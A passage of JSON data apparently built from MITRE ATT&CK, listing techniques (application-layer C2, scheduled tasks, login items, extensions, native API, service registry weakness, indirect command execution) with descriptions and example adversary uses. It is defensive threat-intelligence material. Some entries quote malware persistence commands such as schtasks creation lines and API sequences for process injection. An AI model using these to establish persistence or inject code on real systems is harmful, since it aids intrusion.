      "The  malware communicates to its command server using HTTP with an encrypted payload.",
      "has used both HTTP and HTTPS for C2.",
      "implements a command and control protocol over HTTP.",
      "communicates with its C2 server over HTTPS.",
      "communicates over HTTP or HTTPS for C2.",
      "uses HTTP and HTTPS for command and control.",
      "uses HTTP for command and control.",
      "uses HTTP for C2.",
      "uses HTTP for command and control.",
      "communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.",
      "uses HTTP for command and control.",
      "uses HTTP as a transport to communicate with its command server.",
      "uses HTTP or HTTPS for C2.",
      "uses HTTP for command and control.",
      "uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.",
      "main method of communicating with its C2 servers is using HTTP or HTTPS.",
      "connects to port 80 of a C2 server using Wininet API.",
      "uses HTTP and HTTPS for command and control.",
      "Various implementations of  communicate with C2 over HTTP, SMTP, and POP3.",
      "has used HTTP requests for command and control.",
      "uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.",
      "has used HTTP, HTTPS, and DNS for command and control.",
      "One variant of  uses HTTP and HTTPS for C2.",
      "command and control occurs via HTTPS over port 443.",
      "will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.  will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Adversaries can also use  to establish an RDP connection with a controller over TCP/7519.",
      "uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.",
      "can communicate over HTTP, SMTP, and POP3 for C2.",
      "The  C2 channel uses HTTP POST requests.",
      "uses HTTPS for C2.",
      "can be configured to use HTTP or DNS for command and control.",
      "can communicate using HTTP or HTTPS.",
      "can use HTTP or HTTPS for command and control to hard-coded C2 servers.",
      "has used , a RAT that uses HTTP to communicate.",
      "uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.",
      "Some variants of  use SSL to communicate with C2 servers.",
      "uses HTTP for C2.",
      "can communicate to its C2 over HTTP and HTTPS if directed.",
      "uses HTTP for C2.",
      "network traffic can communicate over HTTP.",
      "variants have communicated with C2 servers over HTTP and HTTPS.",
      "is capable of using HTTP, HTTPS, SMTP, and DNS for C2.",
      "uses HTTP and HTTPS for C2.",
      "can use HTTP for C2.",
      "uses DNS as its C2 protocol.",
      "communicates with its C2 server over HTTP.",
      "uses HTTP for C2.",
      "uses SSL to encrypt its communication with its C2 server.",
      "uses HTTP and HTTPS for C2.",
      "The \"Uploader\" variant of  visits a hard-coded server over HTTP/S to download the images  uses to receive commands.",
      "transfers files from the compromised host via HTTP or HTTPS to a C2 server.",
      "uses HTTP for C2.",
      "contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.",
      "uses DNS TXT records for C2.",
      "The  malware platform supports many standard protocols, including HTTP, HTTPS, and SMB.",
      "uses DNS TXT records for C2.",
      "uses HTTP for command and control.",
      "communicates with its C2 server over HTTP.",
      "can use HTTP or SMTP for C2.",
      "communicates via DNS for C2.",
      "communicates over HTTP for C2.",
      "A  file stealer can communicate over HTTP for C2.",
      "malware communicates with its C2 server via HTTPS.",
      "used the Plink command-line utility to create SSH tunnels to C2 servers.",
      "used SMTP as a communication channel in various implants, initially using self-registered Google Mail accounts and later compromised email servers of its victims. Later implants such as  use a blend of HTTP and other legitimate channels, depending on module configuration.",
      "has used an IRC channel for C2 communications.",
      "malware has used IRC for C2.",
      "Adversaries can also use  to establish an RDP connection with a controller over TCP/7519.",
      "issued wget requests from infected systems to the C2.",
      "connects to an IRC server for C2.",
      "can use an inverse negotiated SSH connection as part of its C2.",
      "uses a custom command and control protocol that communicates over commonly used ports and is frequently encapsulated by application layer protocols.",
      "has the ability to use Telnet for communication.",
      "can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.",
      "has used an IRC bot for C2 communications.",
      "has used valid accounts over RDP to connect to targeted systems.",
      "is capable of contacting the TOR network for delivering second-stage payloads.",
      "uses TCP and UDP communication for command and control traffic.",
      "During  the adversary initiated Layer Two Tunnelling Protocol (L2TP) connections to Moscow-based IP addresses.",
      "can utilize the Wireguard VPN protocol for command and control.",
      "has used reverse SSH tunnels to communicate to victim devices."
    ],
    "id": "T1071",
    "name": "Application Layer Protocol",
    "similar_words": [
      "Standard Application Layer Protocol",
      "Application Layer Protocol"
    ]
  },
  "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9": {
    "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",
    "example_uses": [
      "A  file stealer can run a TaskScheduler DLL to add persistence.",
      "has created scheduled tasks that run a VBScript to execute a payload on victim machines.",
      "contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.",
      "creates a scheduled task on the system that provides persistence.",
      "creates a scheduled task to run itself every three minutes.",
      "launched a scheduled task to gain persistence using the schtasks /create /sc command.",
      "used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.",
      "has created Windows tasks to establish persistence.",
      "creates a scheduled task to ensure it is re-executed everyday.",
      "creates a scheduled task to maintain persistence on the victim’s machine.",
      "establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“.",
      "launches a scheduled task.",
      "has used scheduled tasks to maintain RDP backdoors.",
      "creates a scheduled task to establish by executing a malicious payload every subsequent minute.",
      "has the capability to schedule remote AT jobs.",
      "New-UserPersistenceOption Persistence argument can be used to establish via a .",
      "has used  and  to register a scheduled task to execute malware during lateral movement.",
      "creates scheduled tasks to establish persistence.",
      "can establish persistence by creating a scheduled task.",
      "has used a scheduled task for persistence.",
      "persists through a scheduled task that executes it every minute.",
      "can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".",
      "can execute commands remotely by creating a new schedule task on the remote system",
      "has used scheduled tasks to persist on victim systems.",
      "has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.",
      "copies an executable payload to the target system by using  and then scheduling an unnamed task to execute the malware.",
      "can be used to schedule a task on a system.",
      "malware has created scheduled tasks to establish persistence.",
      "schedules tasks to invoke its components in order to establish persistence.",
      "tries to add a scheduled task to establish persistence.",
      "has registered itself as a scheduled task to run each time the current user logs in.",
      "has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.",
      "is used to schedule tasks on a Windows system to run at a specific date and time.",
      "schedules the execution one of its modules by creating a new scheduler task.",
      "uses scheduled tasks typically named \"Watchmon Service\" for persistence.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "One persistence mechanism used by  is to register itself as a scheduled task.",
      "malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly.",
      "has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and PoS malware known as TRINITY.",
      "actors use  to schedule tasks to run self-extracting RAR archives, which install  or  on other victims on a network.",
      "actors used the native  Windows task scheduler tool to use scheduled tasks for execution on a victim network.",
      "An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".",
      "used named and hijacked scheduled tasks to establish persistence.",
      "has create a scheduled task named `Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB` for persistence.",
      "has used the scheduled tasks `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor` `\\Microsoft\\Windows\\Ras\\ManagerMobility` `\\Microsoft\\Windows\\WDI\\SrvSetupResults` and `\\Microsoft\\Windows\\WDI\\USOShared` to establish persistence.",
      "used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR [file path] /ru system for persistence.",
      "second stage DLL has set a timer using timeSetEvent to schedule its next execution."
    ],
    "id": "T1053",
    "name": "Scheduled Task/Job",
    "similar_words": [
      "Scheduled Task",
      "Scheduled Task/Job"
    ]
  },
  "attack-pattern--36675cd3-fe00-454c-8516-aebecacbe9d9": {
    "description": "MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's ~/Library/Preferences/ directory in a plist file called com.apple.loginitems.plist (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide’ the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method  SMLoginItemSetEnabled  can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well  (Citation: Adding Login Items).",
    "example_uses": [
      "persists via a login item."
    ],
    "id": "T1162",
    "name": "Login Item",
    "similar_words": [
      "Login Item"
    ]
  },
  "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8": {
    "description": "Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application.   Malicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls. The modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows. ",
    "example_uses": [
      "utilizes malicious Google Chrome browser extensions to steal financial data.",
      "has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.",
      "can install malicious Safari browser extensions to serve ads.",
      "can use malicious browser extensions to steal cookies and other user information.",
      "can install malicious browser extensions that are used to hijack user searches."
    ],
    "id": "T1176",
    "name": "Software Extensions",
    "similar_words": [
      "Browser Extensions",
      "Software Extensions"
    ]
  },
  "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670": {
    "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",
    "example_uses": [
      "leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.",
      "malware can leverage the Windows API call, CreateProcessA(), for execution.",
      "creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().",
      "leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.",
      "uses the API call ShellExecuteW for execution.",
      "executes payloads using the Windows API call CreateProcessW().",
      "parses the export tables of system DLLs to locate and call various Windows API functions.",
      "uses the Windows API call, CreateProcessW(), to manage execution flow.",
      "contains the execFile function to execute a specified file on the system using the NSTask:launch method.",
      "is capable of starting a process using CreateProcess.",
      "has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.",
      "\"beacon\" payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe",
      "can use the Windows API function CreateProcess to execute another process.",
      "has used various API calls as part of its checks to see if the malware is running in a sandbox.",
      "can use Native API to create a new process and to start services.",
      "has used several Windows functions for various purposes.",
      "can use various Linux API functions including those for execution and discovery.",
      "has used the Windows API to communicate with the Service Control Manager to execute a thread.",
      "has used Windows API calls including `NetUserAdd` and `NetUserDel`.",
      "has used various Windows API calls.",
      "can use RegOpenKeyW to access the Registry.",
      "The file collection tool used by  can utilize native API including ReadDirectoryChangeW for folder monitoring.",
      "Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe",
      "has used API functions such as `Process32First` `Process32Next` and `ShellExecuteA`.",
      "can use GetUserNameW GetComputerNameW and GetComputerNameExW to gather information.",
      "During   used Windows API `ObtainUserAgentString` to obtain the victim's User-Agent and used the value to connect to their C2 server.",
      "has the ability to use OS APIs including `CheckRemoteDebuggerPresent`.",
      "has leveraged CreateProcessW() call to execute the debugger.",
      "can use multiple Windows API calls for actions on compromised hosts including discovery and execution.",
      "has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum.",
      "can use native Windows APIs including `GetHostByName`.",
      "has called various native OS APIs.",
      "can use GetProcAddress to help delete malicious strings from memory.",
      "has used built-in API functions such as WNetOpenEnumW() WNetEnumResourceW() WNetCloseEnum() GetProcAddress() and VirtualAlloc().",
      "has the ability to launch files using ShellExecute.",
      "has used multiple native APIs including ShellExecuteW to run executablesGetWindowsDirectoryW to create folders and VirtualAlloc WriteProcessMemory and CreateRemoteThread for process injection.",
      "has used the OutputDebugStringW function to avoid malware analysis as part of its anti-debugging technique.",
      "has used `WinHTTP` `CreateProcess` and other APIs for C2 communications and other functions.",
      "has used a variety of Windows API calls including `NtCurrentPeb` and `GetLogicalDrives`.",
      "can leverage API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files.",
      "has called the Windows API to retrieve the hard disk handle and shut down the machine.",
      "can invoke Apple APIs contentsOfDirectoryAtPath pathExtension and (string) compare.",
      "has used CreateProcessW to create child processes.",
      "has used various API calls.",
      "can use a variety of APIs for execution.",
      "can use Windows API functions such as WriteFile CloseHandle and GetCurrentHwProfile during its collection and file storage operations.  can execute its embedded components via CreateProcessA and ShellExecute.",
      "used the CreateFileW() API function with read permissions to access downloaded payloads.",
      "has used a variety of Windows API calls including `GetComputerNameA` `GetUserNameA` and `CreateProcessA`.",
      "During  the threat actors deployed malware that used API calls including `CreateProcessAsUser`.",
      "uses the Windows API call CreateProcessW() to manage execution flow.  has also used Nt* API functions to perform .",
      "can use multiple native APIs including `GetKeyState` `GetForegroundWindow` `GetWindowThreadProcessId` and `GetKeyboardLayout`.",
      "has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.  has also used various often lesser known functions to perform various types of Discovery and .",
      "can run the ShellExecuteW API via the Windows Command Shell.",
      "malware can leverage the Windows API call CreateProcessA() for execution.",
      "has used Windows API calls to obtain information about the compromised host.",
      "and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.",
      "has the ability to use native APIs for execution including GetProcessHeap GetProcAddress and LoadLibrary.",
      "has used native WINAPI calls.",
      "has used direct Windows system calls by leveraging Dumpert.",
      "When executing with non-root permissions  uses the the `shmget` API to create shared memory between other known  processes.  also uses the `execvp` API to help its dead process resurrect.",
      "has the ability to respawn itself using ShellExecuteW and CreateProcessW.",
      "has the ability to use the WinExec API to execute malware on a compromised host.",
      "has used various Windows API functions on a victim's machine.",
      "can use a variety of API calls to execute shellcode.",
      "has used the ShellExecute() function within a script.",
      "has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.",
      "has used the Windows Crypto API to generate an AES key.",
      "has used the `ExitWindowsEx` to flush file buffers to disk and stop running processes and other API calls.",
      "has used a variety of Windows API calls including ShellExecute and WriteProcessMemory.",
      "has used built-in API functions.",
      "can use a number of different APIs for discovery and execution.",
      "has used the Windows API to make detection more difficult.",
      "The  loader can call Windows APIs for discovery process injection and payload decryption.",
      "has used different API calls including `GetProcAddress` `VirtualAllocEx` `WriteProcessMemory` `CreateProcessA` and `SetThreadContext`.",
      "has executed malware by calling the API function `CreateProcessW`.",
      "can use LoadLibraryW and CreateProcess to load and execute code.",
      "can use Native API for execution and to retrieve active services.",
      "can execute the `GetComputerNameA` and `GetComputerNameExA` WinAPI functions.",
      "During  threat actors used the `CreateProcessA` and `ShellExecute` API functions to launch commands after being injected into a selected process.",
      "can call ShellExecuteW to open the default browser on the URL localhost.",
      "can use Native API including GetProcAddress and ShellExecuteW.",
      "has used various Windows API functions including `DeviceIoControl` as part of its encryption process.",
      "can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares.",
      "can utilize Native API functions such as `ToolHelp32` and `Rt1AdjustPrivilege` to enable `SeDebugPrivilege` on a compromised machine.",
      "has used several Windows API functions throughout the encryption process including IsDebuggerPresent TerminateProcess Process32FirstW among others.",
      "can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings.",
      "can use `WinAPI` to remove a victim machine from an Active Directory domain.",
      "has used multiple Windows APIs including HttpInitialize HttpCreateHttpHandle and HttpAddUrl.",
      "can execute an operator-provided Windows command by leveraging functions such as `WinExec` `WriteFile` and `ReadFile`.",
      "has the ability to use CreateProcess to execute a process.",
      "has used macOS API functions to perform tasks.",
      "has used `WinExec` to execute commands received from C2 on compromised hosts.",
      "can use WinSock API for communication including WSASend and WSARecv.",
      "has used native APIs including GetModuleFileName lstrcat CreateFile and ReadFile.",
      "can execute remote commands in the Windows command shell using the WinExec() API.",
      "can load a PE file from memory or the file system and execute it with CreateProcessW.",
      "leverages the Windows API calls: VirtualAlloc() WriteProcessMemory() and CreateRemoteThread() for process injection.",
      "contains a variety of enumeration modules that have an option to use API calls to carry out tasks.",
      "loader can use API functions to load the  backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.",
      "can use various API calls.",
      "During  the first stage downloader resolved various Windows libraries and APIs including `LoadLibraryA()` `GetProcAddress()` and `CreateProcessA()`.",
      "has called ZwWriteVirtualMemory ZwProtectVirtualMemory ZwQueueApcThread and NtResumeThread to inject itself into a remote process.",
      "can use multiple Native APIs.",
      "can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.",
      "can connect to remote shares using `WNetAddConnection2W`.",
      "has the ability to leverage API including `GetProcAddress` and `LoadLibrary`.",
      "has the ability to use multiple dynamically resolved API calls.",
      "can call multiple Windows API functions used for privilege escalation service execution and to overwrite random bites of data.",
      "has hardcoded API calls within its functions to use on the victim's machine.",
      "can use the `ShowWindow` API to avoid detection.",
      "can use various API calls to see if it is running in a sandbox.",
      "has used the `Wow64DisableWow64FsRedirection()` and `Wow64RevertWow64FsRedirection()` functions to disable and restore file system redirection.",
      "can use Windows API calls to gather information from an infected host.",
      "has used the `InterlockedExchange` `SeShutdownPrivilege` and `ExitWindowsEx` Windows API functions.",
      "has used multiple native Windows APIs to execute and conduct process injections.",
      "can use the FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA functions to search for specific strings within browser history.",
      "can use the API `DnsQuery_A` for DNS resolution.",
      "used Windows API functions such as MoveFileEx and NtQueryInformationProcess as part of the  injection process.",
      "malware has used CreateProcess to launch additional malicious components.",
      "can use a variety of API calls on a compromised host.",
      "code modules use various API functions to load and inject code.",
      "can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.",
      "can use Windows API including `WinExec` for execution.",
      "executes native Windows functions such as GetFileAttributesW and `GetSystemInfo`.",
      "used the IsDebuggerPresent OutputDebugString and SetLastError APIs to avoid debugging.  used GetProcAddress and LoadLibrary to dynamically resolve APIs.  also used the Wow64SetThreadContext API as part of a process hollowing process.",
      "uses the native Windows API CallWindowProc() to decode and launch encoded shellcode payloads during execution.  can call kernel mode functions directly to hide the use of process hollowing methods during execution.",
      "can use Windows API functions to inject the ransomware DLL.",
      "has used LoadLibrary() GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.",
      "custom crypter CryptOne leveraged the VirtualAlloc() API function to help execute the payload.",
      "has the ability to call Win32 API functions to determine if `powershell.exe` is running.",
      "has a function to call the OpenClipboard wrapper.",
      "can use a variety of API calls for persistence and defense evasion.",
      "can use multiple native APIs including `WriteProcessMemory` `CreateProcess` and `CreateRemoteThread` for process injection.",
      "can call multiple Windows APIs for execution to share memory and defense evasion.",
      "has used several API calls like `GetLogicalDriveStrings` `SleepEx` `SystemParametersInfoAPI` `CryptEncrypt` and others to execute parts of its attack.",
      "can use Native API for defense evasion discovery and collection.",
      "has the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API.",
      "has used several Win32 API functions to interact with the victim machine.",
      "has used the ShellExecuteW() function call.",
      "has used Windows API functions to install the service and shim.",
      "can use the `LoadResource` and `CreateProcessW` APIs for execution.",
      "After escalating privileges  calls TerminateProcess() CreateRemoteThread and other Win32 APIs.",
      "can call `System.Net.HttpWebRequest` to identify the default proxy configured on the victim computer.",
      "can use Native API including CreateProcess GetProcessById and WriteProcessMemory.",
      "can use `ShellExecute` to execute applications.",
      "has the ability to enumerate the infected system's user name via GetUserNameW.",
      "has used Windows APIs including `GetKeyboardType` `NetUserAdd` and `NetUserDel`.",
      "has leveraged native OS function calls to retrieve victim's network adapter's information using GetAdapterInfo() API.",
      "has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.",
      "has used the Windows API to execute code within a victim's system.",
      "can use a variety of API calls.",
      "has the ability to use various Windows API functions to perform tasks.",
      "can use multiple APIs for discovery communication and execution.",
      "can execute through the WinExec API.",
      "can use Native API to enable obfuscation including `GetLastError` and `GetTickCount`.",
      "has the ability to use native APIs for numerous functions including discovery and defense evasion.",
      "uses the SetSecurityDescriptorDacl API to reduce object integrity levels.",
      "has deployed payloads that use Windows API calls on a compromised host.",
      "has used a variety of Windows API functions.",
      "uses various API to perform behaviors such as executing payloads and performing local enumeration.",
      "can use the Windows API functions `GetProcAddress` `LoadLibrary` and `CreateProcess` to execute another process.",
      "can leverage API functions for execution.",
      "first stage has been executed by a call to CreateProcess with the decryption password in an argument.  has used a call to LoadLibrary to load its installer.",
      "can call the `GetNetworkParams` API as part of its C2 establishment process.",
      "can leverage Native APIs through plugins including `GetLogicalDrives`.",
      "can use various APIs to allocate memory and facilitate code execution/injection.",
      "has the ability to dynamically resolve and use APIs including `SeTakeOwnershipPrivilege`.",
      "can leverage native API including RegisterServiceCtrlHandler to register a service.RegisterServiceCtrlHandler",
      "has leveraged several Windows API calls to create processes gather disk information and detect debugger activity.",
      "used dynamic API resolutions to various Windows APIs by leveraging `LoadLibrary()` and `GetProcAddress()`.",
      "dispatcher has used CreateProcessW API for execution.",
      "has used a number of API calls including `VirtualAlloc` `VirtualFree` `LoadLibraryA` `GetProcAddress` and `ExitProcess`.",
      "used several Windows API functions to gather information from the infected system.",
      "has used dynamic API resolution to avoid identifiable strings within the binary including RegEnumKeyW.",
      "makes various native API calls.",
      "has the ability to use the CreatePipe API to add a sub-process for execution via .",
      "has used API calls during execution.",
      "has used `CreateProcess` to create a new process to run its executable and `WNetEnumResourceW` to enumerate non-hidden shares.",
      "has the ability to call Windows APIs.",
      "can use winapiexec tool for indirect execution of ShellExecuteW and CreateProcessA.",
      "has used Windows APIs including `ExitWindowsEx` and `GetKeyboardType`.",
      "has leveraged the Windows API including using CreateProcess() or ShellExecute() to perform a variety of tasks.",
      "can use the API `DeviceIoControl` to resize the allocated space for and cause the deletion of volume shadow copy snapshots.",
      "imports native Windows APIs such as `GetConsoleWindow` and `ShowWindow`.",
      "can use Windows APIs including `LoadLibrary` and `GetProcAddress`.",
      "uses  to disable and restore file system redirection by using the following functions: `Wow64DisableWow64FsRedirection()` and `Wow64RevertWow64FsRedirection()`.",
      "uses native Windows APIs to determine if the process is being debugged and analyzed such as `CheckRemoteDebuggerPresent` `NtQueryInformationProcess` `ProcessDebugPort` and `ProcessDebugFlags`. Other  variants populate a global list of Windows API addresses from the `NTDLL` and `KERNEL32` libraries and references these items instead of calling the API items to obfuscate execution.",
      "can call the `GetSystemDirectoryW` API to locate the system directory.",
      "has used multiple Windows API post exploitation including `GetAdaptersInfo` `CreateToolhelp32Snapshot` and `CreateProcessW`.",
      "calls `ShellExecuteW` with the `IpOperation` parameter `RunAs` to launch `explorer.exe` with elevated privileges.",
      "calls the `WaitForSingleObject` API function as part of time-check logic.",
      "has the ability to directly call native Windows API items during execution.",
      "can pass commands using native APIs.",
      "can use native APIs including `LoadLibraryExA` for execution and `NtSetInformationProcess` for defense evasion purposes.",
      "uses the native Windows API for functionality including defense evasion.",
      "uses the native Windows API CallWindowProc() to decode and launch encoded shellcode payloads during execution.  can call kernel mode functions directly to hide the use of process hollowing methods during execution.  has also used the `CreateToolhelp32Snapshot` `GetFileAttributesA` and `CreateProcessA` functions to obtain a list of running processes to check for security products and to execute its malware.",
      "uses the `SetThreadExecutionState` API to prevent the victim system from entering sleep.",
      "utilizes WinAPI calls to gather victim system information.",
      "has the ability to use Native APIs.",
      "has used the `ShowWindow` and `CreateProcessW` APIs."
    ],
    "id": "T1106",
    "name": "Native API",
    "similar_words": [
      "Execution through API",
      "Native API"
    ]
  },
  "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427": {
    "description": "Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as FailureCommand) that may be executed in an elevated context anytime the service fails or is intentionally corrupted. (Citation: Twitter Service Recovery Nov 2017)",
    "example_uses": [],
    "id": "T1058",
    "name": "Service Registry Permissions Weakness",
    "similar_words": [
      "Service Registry Permissions Weakness"
    ]
  },
  "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e": {
    "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
    "example_uses": [
      "can be used to subvert controls and possibly conceal command execution by not directly invoking .",
      "persistence mechanisms have used forfiles.exe to execute .htm files.",
      "uses the  utility to execute commands on the system.",
      "has used pcalua.exe to obfuscate binary execution and remote connections."
    ],
    "id": "T1202",
    "name": "Indirect Command Execution",
    "similar_words": [
      "Indirect Command Execution"
    ]
  },
  "attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d": {
